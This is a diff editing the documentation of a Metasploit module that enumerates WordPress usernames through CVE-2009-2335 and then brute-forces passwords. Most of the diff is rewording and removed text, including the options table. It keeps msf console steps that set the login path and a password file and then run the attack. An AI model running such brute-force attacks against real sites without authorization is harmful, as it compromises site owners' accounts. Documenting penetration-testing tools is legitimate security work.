@@ -1,6 +1,6 @@
 ## Descriptions
 
-This auxiliary module will brute-force a WordPress installation and first determine valid usernames and then perform a password-guessing attack. WordPress and WordPress MU before 2.8.1 exhibit different behavior for a failed login attempt depending on whether the user account exists, which allows remote attackers to enumerate valid usernames. NOTE: the vendor reportedly disputes the significance of this issue, indicating that the behavior exists for "user convenience." More infomation can be found [here](https://www.cvedetails.com/cve/cve-2009-2335).
+This auxiliary module will brute-force a WordPress installation and first determine valid usernames and then perform a password-guessing attack. WordPress and WordPress MU before 2.8.1 exhibit different behavior for a failed login attempt depending on whether the user account exists, which allows remote attackers to enumerate valid usernames. NOTE: The vendor reportedly disputes the significance of this issue, indicating that the behavior exists for "user convenience." More infomation can be found in [CVE-2009-2335](https://www.cvedetails.com/cve/cve-2009-2335).
 
 ## Verification Steps
 
@@ -11,46 +11,10 @@ This auxiliary module will brute-force a WordPress installation and first determ
 5. Do: ```set RHOSTS [IP]```
 6. Do: ```run```
 
-Configure the module first by pointing it to the path of wp-login.php on the target server. Set the username and password files, set the RHOSTS value, and let it run.
-
 ## Scenarios
-
-**Running the scanner**
 
 ```
 msf > use auxiliary/scanner/http/wordpress_login_enum
-msf auxiliary(wordpress_login_enum) > show options
-
-Module options (auxiliary/scanner/http/wordpress_login_enum):
-
-   Name                 Current Setting  Required  Description
-   ----                 ---------------  --------  -----------
-   BLANK_PASSWORDS      false            no        Try blank passwords for all users
-   BRUTEFORCE           true             yes       Perform brute force authentication
-   BRUTEFORCE_SPEED     5                yes       How fast to bruteforce, from 0 to 5
-   DB_ALL_CREDS         false            no        Try each user/password couple stored in the current database
-   DB_ALL_PASS          false            no        Add all passwords in the current database to the list
-   DB_ALL_USERS         false            no        Add all users in the current database to the list
-   ENUMERATE_USERNAMES  true             yes       Enumerate usernames
-   PASSWORD                              no        A specific password to authenticate with
-   PASS_FILE                             no        File containing passwords, one per line
-   Proxies                               no        A proxy chain of format type:host:port[,type:host:port][...]
-   RANGE_END            10               no        Last user id to enumerate
-   RANGE_START          1                no        First user id to enumerate
-   RHOSTS                                yes       The target address range or CIDR identifier
-   RPORT                80               yes       The target port (TCP)
-   SSL                  false            no        Negotiate SSL/TLS for outgoing connections
-   STOP_ON_SUCCESS      false            yes       Stop guessing when a credential works for a host
-   TARGETURI            /                yes       The base path to the wordpress application
-   THREADS              1                yes       The number of concurrent threads
-   USERNAME                              no        A specific username to authenticate as
-   USERPASS_FILE                         no        File containing users and passwords separated by space, one pair per line
-   USER_AS_PASS         false            no        Try the username as the password for all users
-   USER_FILE                             no        File containing usernames, one per line
-   VALIDATE_USERS       true             yes       Validate usernames
-   VERBOSE              true             yes       Whether to print output for all attempts
-   VHOST                                 no        HTTP server virtual host
-
 msf auxiliary(wordpress_login_enum) > set URI /wordpress/wp-login.php
 URI => /wordpress/wp-login.php
 msf auxiliary(wordpress_login_enum) > set PASS_FILE /tmp/passes.txt
@@ -87,5 +51,3 @@ msf auxiliary(wordpress_login_enum) > run
 [*] Auxiliary module execution completed
 msf auxiliary(wordpress_login_enum) >
 ```
-
-As you can see in the above output that the module is efficient as it only brute-forces passwords against valid usernames and the scan did indeed turn up a valid set of credentials.
